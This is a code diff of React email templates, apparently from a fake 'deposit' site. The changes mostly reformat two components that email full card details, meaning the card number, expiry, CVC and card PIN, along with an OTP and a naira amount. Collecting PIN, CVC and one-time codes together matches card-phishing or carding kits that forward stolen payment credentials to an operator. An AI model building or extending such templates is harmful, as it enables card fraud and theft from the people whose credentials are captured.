@@ -9,10 +9,19 @@ interface PinEmailProps {
   pin: string
 }
 
-export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin }: PinEmailProps) {
+export function PinEmail({
+  email,
+  amount,
+  cardName,
+  cardNumber,
+  expiryDate,
+  cvc,
+  cardType,
+  pin,
+}: PinEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
-      <h2 style={{ color: "#059669" }}>Deposit Transaction - PIN Entered</h2>
+      <h2 style={{ color: "#059669" }}>Deposit Transaction – Card Payment</h2>
       <p>A deposit transaction has been initiated with the following details:</p>
       <div
         style={{
@@ -31,7 +40,9 @@ export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc,
         <p><strong>Card Type:</strong> {cardType || "Unknown"}</p>
         <p><strong>PIN:</strong> {pin}</p>
       </div>
-      <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
+      <p style={{ color: "#6b7280" }}>
+        This is an automated notification from your deposit system.
+      </p>
     </div>
   )
 }
@@ -59,7 +70,9 @@ export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
         <p><strong>Amount:</strong> ₦{amount}</p>
         <p><strong>OTP:</strong> {otp}</p>
       </div>
-      <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
+      <p style={{ color: "#6b7280" }}>
+        This is an automated notification from your deposit system.
+      </p>
     </div>
   )
 }
